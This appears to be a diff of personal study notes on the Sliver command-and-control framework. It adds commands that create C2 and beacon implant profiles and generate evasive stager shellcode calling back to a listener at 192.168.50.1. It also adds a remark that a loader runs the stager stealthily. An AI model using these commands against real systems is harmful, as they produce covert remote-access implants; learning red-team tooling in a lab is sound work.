@@ -117,5 +117,12 @@ Using mTLS authenticates both sides for better security. It sort of acts as an a
 ---
 
 ### March 16
-Creating a custom c2profile: `sliver > c2profiles generate -f /home/charlitos/sliver/uris.txt -n custom-c2profile -i`. This defines trasnport behavior and how the implant communicates. This is different from `profiles new ...`,  which creates a profile that is used when generating an implant, which dictates how the implant itself shoudl behave.
+Creating a custom c2profile: `sliver > c2profiles generate -f /home/charlitos/sliver/uris.txt -n custom-c2profile -i`. This defines trasnport behavior and how the implant communicates. This is different from `profiles new ...`,  which creates a profile that is used when generating an implant, which dictates how the implant itself should behave.
 
+Creating a custom (beacon) implant profile: `profiles new beacon stealthy-beacon --http https://192.168.50.1:443 --c2profile custom-c2profile --format shellcode --arch amd64 --evasion --seconds 60 --jitter 3`.
+
+^^^ scratch all this. I had issues trying to make a custom c2profile and then creating an implant profile using the custom c2profile. It didn't work out.
+
+Generates stager shellcode `generate beacon --name stealth-stager --format shellcode --arch amd64 --http https://192.168.50.1:443 --c2profile default --evasion --skip-symbols --poll-timeout 60 --reconnect 60`
+
+We use a loader as it is a way to execute the stager more stealthily.
